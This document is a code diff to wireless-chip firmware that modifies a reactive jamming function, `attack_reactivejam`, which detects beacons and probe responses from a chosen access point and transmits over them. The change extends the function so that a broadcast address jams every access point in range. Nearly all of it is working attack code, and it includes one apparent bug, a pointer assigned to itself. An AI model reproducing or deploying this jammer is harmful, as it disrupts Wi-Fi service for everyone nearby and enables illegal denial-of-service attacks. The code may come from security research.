@@ -273,7 +273,8 @@ void attack_free_packet(struct ath_softc_tgt *sc, struct ath_tx_buf *bf)
 
 /**
  * Reactively jam beacons and probe responses from an AP having MAC address `source`.
- * The attack is executed for `msecs` milisconds.
+ * The attack is executed for `msecs` milisconds. If the MAC address `source` is a
+ * multicast/broadcast address, then *all* beacons and probe responses will be jammed.
  *
  * Possible improvements/changes:
  * - Send larger packets so there is more overlap.
@@ -287,12 +288,14 @@ int attack_reactivejam(struct ath_softc_tgt *sc, unsigned char source[6],
 	static struct ath_tx_buf *bf;
 	static struct ieee80211_frame wh;
 	struct ath_hal *ah = sc->sc_ah;
-	struct ath_rx_desc *ds, *ds2, *ds3, *ds4;
+	struct ath_rx_desc *ds, *ds2;
+	struct ar5416_desc_20 *ads, *ads2, *txads;
 	struct ath_txq *txq;
-	volatile struct ar5416_desc_20 *txads, *rxads;
 	volatile unsigned char *buff;
 	unsigned int elapsed, freq, prev;
 
+	//dump_rx_macbufs(ah);
+	//dump_rx_tailq(sc);
 	printk(">reactjam\n");
 
 	// disable (simulated) interrupts and configure radio
@@ -301,26 +304,31 @@ int attack_reactivejam(struct ath_softc_tgt *sc, unsigned char source[6],
 
 	// Do not retransmit dummy packet to jam. Change 3rd parameter
 	// to 1 to retransmit the dummy packet.
-	bf = attack_build_packet(sc, (uint8_t*)&wh, sizeof(wh), 0, NULL);
-	A_MEMSET(&wh, 2, sizeof(wh));
+	bf = attack_build_packet(sc, NULL, 24, 0, NULL);
 
-	// add buffer to the Tx list, save ath_tx_desc of the buffer
+	// Borrow a transmit descriptor
 	txq = &sc->sc_txq[TXQUEUE];
-	//ATH_TXQ_INSERT_TAIL(txq, bf, bf_list);
 	txq->axq_link = &bf->bf_lastds->ds_link;
 	txads = AR5416DESC_20(bf->bf_desc);
 
 	//
-	// Prepare circular Rx buffer list: ds -> ds2 -> ds3 -> ds -> ...
+	// Prepare self-linked Rx buffer 
 	//
 
-	ds = asf_tailq_first(&sc->sc_rxdesc);
-	ds2 = asf_tailq_next(ds, ds_list);
-	ds3 = asf_tailq_next(ds2, ds_list);
-	ds4 = asf_tailq_next(ds3, ds_list);
+	// - We cannot chance the ds_link field of the descriptor currently in use. It seems
+	//   this value is cached? Work around this by using the second frame.
+	// - Even though we will skip the first transmit descriptor, the wireless chips still
+	//   seems to mark it with AR_RxDone. Worth further investigation.
+	ds = (struct ath_rx_desc *)ar5416GetRxDP(ah);
+	ds = (struct ath_rx_desc *)ds->ds_link;
+	ds2 = (struct ath_rx_desc *)ds->ds_link;
+	ds->ds_list.tqe_next = ds;
+	ds->ds_link = (unsigned int)ds;
 
-	ds3->ds_list.tqe_next = ds;
-	ds3->ds_link = (unsigned int)ds;
+	ads  = (struct ar5416_desc_20 *)ds;
+	ads2 = (struct ar5416_desc_20 *)ads2;
+
+	ah->ah_setRxDP(ah, 0);
 
 	//
 	// Initialize Timer
@@ -343,8 +351,7 @@ int attack_reactivejam(struct ath_softc_tgt *sc, unsigned char source[6],
 	// MONITOR THE BUFFERS
 	//
 
-	rxads = AR5416DESC_20(ds);
-	ah->ah_setRxDP(ah, (unsigned int)rxads);
+	ah->ah_setRxDP(ah, (unsigned int)ads);
 
 	// Enable Rx
 	iowrite32_mac(AR_CR, AR_CR_RXE);
@@ -354,7 +361,7 @@ int attack_reactivejam(struct ath_softc_tgt *sc, unsigned char source[6],
 	while (elapsed < msecs)
 	{
 		// fill in data that shouldn't occur in valid 802.11 frames
-		buff = (volatile unsigned char *)rxads->ds_data;
+		buff = (volatile unsigned char *)ds->ds_data;
 		buff[15] = 0xF1;
 
 		// prepare to send jam packet
@@ -372,8 +379,11 @@ int attack_reactivejam(struct ath_softc_tgt *sc, unsigned char source[6],
 		//  - ds_rxstatus1 & AR_DataLen  : #bytes already written to RAM
 		//  - ds_rxstatus1 & AR_NumDelim : always zero?
 
-		// jam beacons and probe responses from the bssid
-		if (A_MEMCMP(source, buff + 10, 6) == 0 && (buff[0] == 0x80 || buff[0] == 0x50) )
+		// 1. Jam beacons and probe responses (0x80 and 0x50, respectively)
+		// 2. - If source is a multicast MAC address, then jam *all* transmitters
+		//    - Otherwise jam only the transmitter with MAC address `source`
+		if ( (buff[0] == 0x80 || buff[0] == 0x50)
+		     && ((source[0] & 1) || A_MEMCMP(source, buff + 10, 6) == 0) )
 		{
 			// Abort Rx
 			*((a_uint32_t *)(WLAN_BASE_ADDRESS + AR_DIAG_SW)) |= AR_DIAG_RX_ABORT;
@@ -392,9 +402,6 @@ int attack_reactivejam(struct ath_softc_tgt *sc, unsigned char source[6],
 			printk("-");
 		}
 
-		// move to next buffer in the (circular) list
-		rxads = AR5416DESC_20(rxads->ds_link);
-
 		// update elapsed time
 		prev = update_elapsed(prev, freq, &elapsed);
 	}
@@ -406,21 +413,20 @@ int attack_reactivejam(struct ath_softc_tgt *sc, unsigned char source[6],
 	//
 
 	// fix the linked list
-	ds3->ds_list.tqe_next = ds4;
-	ds3->ds_link = (unsigned int)ds4;
+	ds->ds_list.tqe_next = ds2;
+	ds->ds_link = (unsigned int)ds2;
 
-	// Temporarily disable Rx
-	iowrite32_mac(AR_CR, AR_CR_RXD);
-	iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW) | AR_DIAG_RX_DIS);
+	// restore the recieve descriptor
+	ads->ds_rxstatus8 &= ~AR_RxDone;
+	ah->ah_setRxDP(ah, (unsigned int)ds);
 
-	// Clear "received flag" of all subsequent buffers
-	rxads = (struct ar5416_desc_20 *)ar5416GetRxDP(ah);
-	while (rxads != NULL) {
-		rxads->ds_rxstatus8 &= ~AR_RxDone;
-		rxads = (struct ar5416_desc_20 *)rxads->ds_link;
-	}
+	//dump_rx_macbufs(ah);
+	//dump_rx_tailq(sc);
 
-	// Enable Rx again
+	// remove pointer to packet ready to transmit
+	*((a_uint32_t *)(WLAN_BASE_ADDRESS + AR_QTXDP(txq->axq_qnum))) = 0;
+
+	// Assure Rx is still enabled
 	iowrite32_mac(AR_DIAG_SW, ioread32_mac(AR_DIAG_SW) & ~AR_DIAG_RX_DIS);
 	iowrite32_mac(AR_CR, AR_CR_RXE);
 
